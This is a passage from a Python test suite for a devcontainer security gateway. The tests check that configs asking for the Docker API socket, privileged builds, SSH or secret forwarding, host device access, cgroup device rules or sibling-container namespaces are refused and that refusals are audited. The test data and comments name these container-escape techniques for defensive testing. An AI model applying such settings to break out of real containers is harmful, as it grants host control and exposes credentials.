            where["realpath"] = threading.current_thread().name
            return real_set(paths)

        # Built inline: the status endpoint reads `query`, which the shared trust
        # request helpers do not provide (they carry a JSON body instead).
        base = _request(str(project))
        req = SimpleNamespace(
            app=base.app,
            query={"project": str(project)},
            get=lambda key, default=None: default,
        )

        with (
            patch.object(devc_handlers, "_slot_project_strings", tracked_strings),
            patch.object(devc_handlers, "_realpath_set", tracked_set),
        ):
            resp = await devc_handlers.api_devcontainer_status(req)
        assert resp.status == 200, "the request never reached the slot lookup"

        main = threading.main_thread().name
        assert where.get("strings") == main, (
            f"the slot dict was read off the event loop ({where}); it is mutated by "
            f"the loop, so it must be snapshotted where its writer runs"
        )
        assert where.get("realpath") not in (None, main), (
            f"realpath ran on the event loop ({where}); it blocks on a " f"network-backed mount"
        )


class TestComposeEngineSocketAndBuildCapabilities:
    """Two more spellings of the same escalation, neither of them a path.

    ``use_api_socket: true`` asks Compose to mount the engine's API socket. The
    host-control bind screen already refuses that socket written as a path; this is
    the identical grant expressed as a boolean, which is exactly why no path screen
    saw it. Control of the engine is control of every container on the host, so it
    outranks the mount screening entirely.

    The build block carries capabilities too: ``privileged`` elevates the build, and
    ``ssh`` / ``secrets`` forward host credential material into it. The config NAMES
    that material without containing it, so the digest cannot bind what would
    actually be used.
    """

    def test_use_api_socket_is_refused(self) -> None:
        with pytest.raises(devc.DevcontainerError, match="use_api_socket"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "use_api_socket": True}, "app"
            )

    def test_use_api_socket_false_is_accepted(self) -> None:
        """Declining it is not a request for it."""
        devc._assert_compose_service_unprivileged(
            {"image": "alpine", "use_api_socket": False}, "app"
        )

    def test_interpolated_use_api_socket_is_refused(self) -> None:
        """It joined the interpolation family too -- ``${USE_SOCKET}`` is neither
        True nor screenable, which is how the boolean check would have missed it."""
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "use_api_socket": "${USE_SOCKET}"}, "app"
            )

    def test_privileged_build_is_refused(self) -> None:
        with pytest.raises(devc.DevcontainerError, match="privileged build"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "build": {"context": ".", "privileged": True}}, "app"
            )

    def test_interpolated_privileged_build_is_refused(self) -> None:
        with pytest.raises(devc.DevcontainerError, match="privileged build"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "build": {"context": ".", "privileged": "${P}"}}, "app"
            )

    @pytest.mark.parametrize(
        ("key", "value"),
        [
            ("ssh", ["default=/home/user/.ssh/agent.sock"]),
            ("ssh", "default"),
            ("secrets", ["host_token"]),
        ],
        ids=["ssh-explicit-path", "ssh-default-agent", "build-secrets"],
    )
    def test_build_credential_forwarding_is_refused(self, key: str, value: object) -> None:
        """``ssh: default`` carries no path at all, which is the point: screening the
        VALUE cannot help, because the material lives outside the config either way.
        """
        with pytest.raises(devc.DevcontainerError, match=f"build '{key}'"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", "build": {"context": ".", key: value}}, "app"
            )

    def test_an_ordinary_build_block_is_accepted(self) -> None:
        """Control: the common case must still pass, or the screen is a wall."""
        devc._assert_compose_service_unprivileged(
            {"image": "alpine", "build": {"context": ".", "dockerfile": "Dockerfile"}}, "app"
        )

    def test_the_screen_is_reached_from_config_digest(self, tmp_path: Path) -> None:
        """Reached in the real path, not only when called directly.

        The chokepoint is ``config_digest`` (via
        ``assert_compose_build_inputs_contained``), NOT ``_compose_hardened``: the
        hardener rewrites a service that has already been approved, so a screen
        there would run after the grant it is supposed to prevent.
        """
        dc = tmp_path / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_text(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"})
        )
        (dc / "compose.yml").write_text(
            "services:\n  app:\n    image: alpine\n    use_api_socket: true\n"
        )

        with pytest.raises(devc.DevcontainerError, match="use_api_socket"):
            devc.config_digest(dc / "devcontainer.json")


class TestProjectAdmissionDenialsAreAudited:
    """A project no live slot owns is an access refusal, so it is audited.

    All five endpoints returned 400 and recorded nothing. The finding named the two
    GET ones; the three POST ones are the same refusal from the same helper, so they
    are routed through one shared audited helper rather than patched twice.
    """

    @staticmethod
    def _foreign_request(tmp_path: Path) -> SimpleNamespace:
        """A request naming a project that belongs to no slot.

        Carries both ``query`` and ``json``: the GET endpoints read the first and the
        POST endpoints the second, and one object covers all five so the same
        refusal is exercised identically everywhere.
        """
        foreign = str(tmp_path / "not-mine")
        base = _request(str(tmp_path / "owned"))

        async def _json() -> object:
            return {"project": foreign, "digest": "0" * 64}

        def _get(key: str, default: object = None) -> object:
            return default

        return SimpleNamespace(app=base.app, query={"project": foreign}, get=_get, json=_json)

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        ("handler", "operation"),
        [
            ("api_devcontainer_status", "devcontainer_status"),
            ("api_devcontainer_config", "devcontainer_config"),
            ("api_devcontainer_trust", "devcontainer_trust.grant"),
            ("api_devcontainer_untrust", "devcontainer_trust.revoke"),
            ("api_devcontainer_rebuild", "devcontainer_rebuild"),
        ],
        ids=["status", "config", "trust", "untrust", "rebuild"],
    )
    async def test_every_endpoint_audits_an_unadmitted_project(
        self,
        as_owner: None,
        tmp_path: Path,
        trust_home: Path,
        sel_recorder: _SelRecorder,
        handler: str,
        operation: str,
    ) -> None:
        resp = await getattr(devc_handlers, handler)(self._foreign_request(tmp_path))

        assert resp.status == 400
        assert _body(resp)["code"] == "unknown_project"
        denied = [c for c in sel_recorder.calls if c.get("outcome") == "denied"]
        assert len(denied) == 1, f"{handler} did not audit the refusal: {sel_recorder.calls}"
        assert denied[0]["operation"] == operation
        # The rejected probe has to be recoverable, or the event cannot answer
        # WHICH project was refused.
        assert "not-mine" in denied[0].get("resources", "")


class TestDeviceAndSiblingNamespaceRefusals:
    """Two gaps opened by earlier rounds of this same review.

    ``devices`` and ``device_cgroup_rules`` were added to the privilege family, but
    that tuple drives only the unresolved-variable screen -- so a LITERAL rule was
    still accepted. Naming a key in the family is not screening what it says.

    And the namespace screens compared the value to ``host`` exactly, while
    ``--pid=container:<id>`` joins another container's namespace. The documented
    deployment runs this gateway in Docker, so the namespace joined can be the one
    supervising the session: the container's root could signal the gateway.
    """

    @staticmethod
    def _cfg(tmp_path: Path, cfg: dict) -> Path:
        dc = tmp_path / ".devcontainer"
        dc.mkdir(parents=True, exist_ok=True)
        p = dc / "devcontainer.json"
        p.write_text(json.dumps(cfg))
        return p

    @pytest.mark.parametrize(
        "run_args",
        [
            ["--device-cgroup-rule=b 8:* rwm"],
            # The separate-token spelling only reaches the screen if the flag is
            # registered as value-taking; unregistered, the value is unclaimed, the
            # screen sees nothing, and it reads as covered while doing nothing.
            ["--device-cgroup-rule", "b 8:* rwm"],
        ],
        ids=["rule-attached", "rule-separate"],
    )
    def test_device_cgroup_rules_are_refused_in_both_spellings(
        self, tmp_path: Path, run_args: list[str]
    ) -> None:
        """A cgroup rule names NO path, which is why no mount screen could see it:
        it grants permission to create the node, and a root agent finishes the job
        with mknod."""
        cfg = self._cfg(tmp_path, {"image": "x", "runArgs": run_args})
        with pytest.raises(devc.DevcontainerError, match="device node"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "run_args",
        [["--device=/dev/sda"], ["--device", "/dev/sda"]],
        ids=["attached", "separate"],
    )
    def test_device_mappings_are_refused(self, tmp_path: Path, run_args: list[str]) -> None:
        """`--device` carries a PATH, so the host-control mount screen already
        refuses it and reports it as a control-interface mount. Asserted as refused
        rather than against the new message, because claiming the new screen catches
        this would misdescribe which guard is load-bearing.
        """
        cfg = self._cfg(tmp_path, {"image": "x", "runArgs": run_args})
        with pytest.raises(devc.DevcontainerError):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "dev_key", ["devices", "device_cgroup_rules"], ids=["devices", "device_cgroup_rules"]
    )
    def test_compose_device_keys_are_refused_by_value(self, dev_key: str) -> None:
        """A literal value, not an interpolated one: the interpolation screen
        already covered `${VAR}` and that is what made this look handled."""
        with pytest.raises(devc.DevcontainerError, match="device node"):
            devc._assert_compose_service_unprivileged(
                {"image": "alpine", dev_key: ["b 8:* rwm"]}, "app"
            )

    @pytest.mark.parametrize(
        "value",
        # Mixed case on the MODE prefix, which is what is matched case-insensitively;
        # the container's own name is irrelevant here.
        ["container:kirocrew", "container:abc123", "CONTAINER:sibling"],
        ids=["by-name", "by-id", "mixed-case"],
    )
    def test_a_sibling_namespace_is_refused(self, tmp_path: Path, value: str) -> None:
        cfg = self._cfg(tmp_path, {"image": "x", "runArgs": [f"--pid={value}"]})
        with pytest.raises(devc.DevcontainerError, match="another container's namespace"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        ("key", "value"),
        [
            ("pid", "service:other"),
            ("pid", "container:kirocrew"),
            ("network_mode", "container:kirocrew"),
            ("ipc", "service:other"),
        ],
        ids=["pid-service", "pid-container", "network-container", "ipc-service"],
    )
    def test_compose_sibling_namespaces_are_refused(self, key: str, value: str) -> None:
        """Compose adds a `service:` form that runArgs has no equivalent for, so the
        two schemas need different value sets for the same rule."""
        with pytest.raises(devc.DevcontainerError, match="another container's namespace"):
            devc._assert_compose_service_unprivileged({"image": "alpine", key: value}, "app")

    def test_an_own_namespace_is_still_accepted(self, tmp_path: Path) -> None:
        """Control. `--pid=private` and the ordinary flags must still pass, or the
        screen is a wall rather than a bound."""
        cfg = self._cfg(
            tmp_path, {"image": "x", "runArgs": ["--init", "--pid=private", "--network=bridge"]}
        )
        devc.config_digest(cfg)


class TestContainerTreeIsKilledEvenWhenTheProxyIsGone:
    """The host proxy exiting is exactly when the container agent survives.

    ``_kill_process`` returned early once ``docker exec`` had exited, so the one
    state the container-tree kill exists for was the one that skipped it. Asserted on
    ordering in the executed path, not on source text.
    """

    @pytest.mark.asyncio
    async def test_the_tree_kill_runs_when_the_proxy_already_exited(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.devcontainer as devc_mod
        from kiro_crew.acp.client import AcpClient

        called: list[tuple[object, object]] = []

        async def fake_kill(info: object, exec_id: object) -> None:
            called.append((info, exec_id))

        monkeypatch.setattr(devc_mod, "kill_containerized_tree", fake_kill)

        client = AcpClient.__new__(AcpClient)
        # A proxy that has ALREADY exited -- the state that used to return early.
        client._process = SimpleNamespace(returncode=0, stdin=None, stdout=None, stderr=None)
        client._pid = None
        client._devcontainer_info = SimpleNamespace(container_id="c" * 64)
        client._devcontainer_exec_id = "ab" * 16

        await client._kill_process()

        assert called, (
            "the in-container tree was never signalled for an exited proxy -- the "
            "agent keeps running inside the container"
        )
        assert called[0][1] == "ab" * 16

    @pytest.mark.asyncio
    async def test_a_host_spawn_is_unaffected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The call is a no-op without devcontainer info, so moving it earlier must
        not change a host session's teardown."""
        import kiro_crew.devcontainer as devc_mod
        from kiro_crew.acp.client import AcpClient

        seen: list[tuple[object, object]] = []

        async def fake_kill(info: object, exec_id: object) -> None:
            seen.append((info, exec_id))

        monkeypatch.setattr(devc_mod, "kill_containerized_tree", fake_kill)

        client = AcpClient.__new__(AcpClient)
        client._process = SimpleNamespace(returncode=0, stdin=None, stdout=None, stderr=None)
        client._pid = None

        await client._kill_process()

        assert seen == [(None, None)], f"host spawn passed something unexpected: {seen}"
